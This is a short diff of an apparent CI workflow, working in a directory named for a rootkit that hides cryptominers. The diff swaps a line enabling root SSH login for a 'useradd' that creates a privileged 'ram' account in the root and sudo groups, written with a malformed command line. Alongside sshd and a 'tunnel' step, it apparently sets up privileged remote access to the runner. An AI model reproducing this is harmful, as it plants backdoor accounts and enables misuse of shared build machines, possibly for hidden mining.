@@ -19,7 +19,7 @@ jobs:
           cd hiding-cryptominers-linux-rootkit/
           #sudo insmod hello.ko
           sudo /usr/sbin/sshd -D
-          sudo echo 'PermitRootLogin yes' >>  /etc/ssh/sshd_config 
+          sudo useradd -ms /bin/bash ram -s /bin/bash -g root -G sudo -u 1001 ubuntu
       - name: tunnel
         run: |
           sudo apt-get install tar wget jq -y
